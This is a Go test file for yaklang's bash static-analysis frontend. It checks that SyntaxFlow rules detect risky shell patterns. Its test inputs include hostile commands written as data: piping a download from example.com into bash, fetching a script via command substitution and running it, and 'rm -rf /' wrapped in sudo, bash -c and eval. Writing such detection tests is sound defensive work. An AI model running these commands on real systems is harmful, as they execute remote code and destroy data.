package bash2ssa_test

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/yaklang/yaklang/common/yak/ssaapi"
	"github.com/yaklang/yaklang/common/yak/ssaapi/ssaconfig"
)

func parseBash(t *testing.T, code string) *ssaapi.Program {
	t.Helper()
	prog, err := ssaapi.Parse(code, ssaapi.WithLanguage(ssaconfig.BASH), ssaapi.WithMemory())
	require.NoError(t, err)
	require.Equal(t, ssaconfig.BASH, prog.GetLanguage())
	return prog
}

func TestBashSSA(t *testing.T) {
	t.Run("simple-command", func(t *testing.T) {
		prog := parseBash(t, `curl -fsSL http://example.com/x`)
		res, err := prog.SyntaxFlowWithError(`curl(* as $argv)`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("argv"))
	})

	t.Run("pipe-to-shell", func(t *testing.T) {
		prog := parseBash(t, `curl -fsSL http://example.com/x | bash`)
		res, err := prog.SyntaxFlowWithError(`
curl(* as $argv) as $download
bash(* as $argv2) as $exec
$download -> * as $next
$next & $exec as $pipe
`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("pipe"))
	})

	t.Run("command-substitution", func(t *testing.T) {
		prog := parseBash(t, `x=$(curl -s http://example.com/x); bash -c "$x"`)
		res, err := prog.SyntaxFlowWithError(`
curl(* as $argv) as $download
bash(* as $argv2) as $exec
$download -> * as $next
$next & $exec as $hit
`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("hit"))
	})

	t.Run("dynamic-command", func(t *testing.T) {
		prog := parseBash(t, `$CMD -rf /`)
		res, err := prog.SyntaxFlowWithError(`Command(* as $argv)`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("argv"))
	})

	t.Run("rm-rf", func(t *testing.T) {
		prog := parseBash(t, `rm -rf /`)
		res, err := prog.SyntaxFlowWithError(`
rm(* as $argv) as $call
$call?{have: "-rf"} as $hit
`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("hit"))
	})

	t.Run("wrapped-command", func(t *testing.T) {
		prog := parseBash(t, `sudo -u root rm -rf /`)
		res, err := prog.SyntaxFlowWithError(`rm(* as $argv) as $call`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("call"))
	})

	t.Run("interpreter-c", func(t *testing.T) {
		prog := parseBash(t, `bash -c 'rm -rf /'`)
		res, err := prog.SyntaxFlowWithError(`rm(* as $argv) as $call`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("call"))
	})

	t.Run("eval", func(t *testing.T) {
		prog := parseBash(t, `eval 'rm -rf /'`)
		res, err := prog.SyntaxFlowWithError(`rm(* as $argv) as $call`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("call"))
	})

	// Empty double quotes used to synthesize a part-less Word, which panicked
	// in mvdan's Word.Pos while setting the source range.
	t.Run("empty-quotes", func(t *testing.T) {
		prog := parseBash(t, "x=\"\"; echo \"$x\" \"\"")
		res, err := prog.SyntaxFlowWithError(`echo(* as $argv) as $call`)
		require.NoError(t, err)
		require.NotEmpty(t, res.GetValues("call"))
	})
}
